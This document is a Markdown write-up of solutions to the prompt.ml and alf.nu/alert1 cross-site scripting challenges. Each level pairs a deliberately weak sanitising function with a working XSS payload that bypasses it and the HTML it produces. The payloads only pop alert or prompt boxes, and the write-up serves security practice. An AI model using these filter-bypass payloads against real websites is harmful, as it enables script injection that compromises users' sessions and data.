# prompt.ml

## Challenges
- [0](#0)
- [1](#1)
- [2](#2)
- [7](#7)
- [A](#a)

## 0

- Task
 
```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
} 
```

- Solution

```
"><svg onload=prompt(1)//
```

- HTML source

```
<input type="text" value=""><svg onload=prompt(1)//">
```

## 1

- Task

```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

- Solution

```
<svg onload=prompt(1)//
```

- HTML source

```
<article><svg onload=prompt(1)// </article>
```

## 2

- Task

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}     
```

- Solution

```
<script>eval.call`${'prompt\x281\x29'}`</script>
```

HTML source

```
<script>eval.call`${'prompt\x281\x29'}`</script>
```

## 7

- Task

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

- Solution

```
"><script>/*#*/prompt/*#*/(1)/*#*/</script>
```

- HTML source

```
<p class="comment" title=""><script>/*"></p>
<p class="comment" title="*/prompt/*"></p>
<p class="comment" title="*/(1)/*"></p>
<p class="comment" title="*/</script>"></p>
```. Escape encoding

### A

- Task

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}   
```

- Solution

```
eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)
```

- HTML source

```
<script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
```

# alf.nu/alert1

### 1. Warmup

- Task

```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

-Solution

```
",alert(1),"
```

### 2. Adobe

- Task

```
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

- Solution

```
\");alert(1)//
```

### JSON

- Task

```
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

- Solution

```
</script><script>alert(1)//
```

### Markdown

- Task

```
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

- Solution

```
[[x|http://onerror=javascript:alert(1)//]]
```

### Skandia

- Task

```
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

- Solution

```
</script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
```

### JSON2

- Task

```
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```

- Solution

```
</scrip</scriptt><script>alert(1)//
```
